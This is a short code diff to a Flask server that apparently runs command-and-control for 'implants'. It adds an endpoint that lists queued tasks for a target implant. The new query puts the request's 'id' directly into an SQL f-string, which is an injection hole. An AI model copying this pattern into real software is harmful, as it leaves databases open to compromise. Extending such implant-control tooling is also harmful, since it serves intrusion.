@@ -101,8 +101,6 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
-
-
 @app.route("/get_qcommands", methods=["POST"])
 def get_qcommands():
     data = request.json
@@ -158,6 +156,22 @@ def get_commands():
         response = db_resp
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
+    except Exception as error:
+        print("failed to retrieve data on get_commands")
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
+
+
+#Client endpoint for listing commands
+@app.route("/client_get_commands", methods=["POST"])
+def client_get_commands():
+    data = request.json
+    id = data['id']
+    try:
+        db_resp = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE target_implant_id={id}")
+        print(f"this is the db response: {db_resp}")
+        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print("failed to retrieve data on get_commands")
         print(error)
